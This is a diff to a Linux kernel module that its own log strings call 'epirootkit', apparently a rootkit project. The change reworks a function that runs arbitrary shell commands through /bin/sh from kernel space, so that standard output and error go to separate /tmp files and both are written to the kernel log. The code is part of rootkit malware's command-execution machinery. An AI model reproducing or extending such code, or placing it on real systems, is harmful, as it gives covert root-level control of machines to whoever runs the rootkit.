@@ -147,7 +147,8 @@ static int exec_str_as_command(char *user_cmd)
 	char *cmd = NULL;
 	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
 	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	char *output_file = "/tmp/kernel_exec_output";
+	char *stdout_file = "/tmp/std.out";
+	char *stderr_file = "/tmp/std.err";
 	int status = 0;														// Return code and number of bytes read
 
 	// Allocate memory for the command string
@@ -156,7 +157,7 @@ static int exec_str_as_command(char *user_cmd)
 		return -ENOMEM;
 
 	// Construct the full shell command with output redirection
-	snprintf(cmd, STD_BUFFER_SIZE, "%s > %s 2>&1", user_cmd, output_file);
+	snprintf(cmd, STD_BUFFER_SIZE, "%s > %s 2> %s", user_cmd, stdout_file, stderr_file);
 	argv[2] = cmd;
 
 	pr_info("epirootkit: exec_str_as_command: executing command: %s\n", cmd);
@@ -173,7 +174,10 @@ static int exec_str_as_command(char *user_cmd)
 	pr_info("epirootkit: exec_str_as_command: command exited with status: %d\n", status);
 
 	// Print the output of the command
-	print_file_content(output_file, INFO);
+	pr_info("epirootkit: exec_str_as_command: command output:\n");
+	print_file_content(stdout_file, INFO);
+	pr_err("epirootkit: exec_str_as_command: command error output:\n");
+	print_file_content(stderr_file, ERR);
 
 	// Cleanup: free memory
 	kfree(cmd);
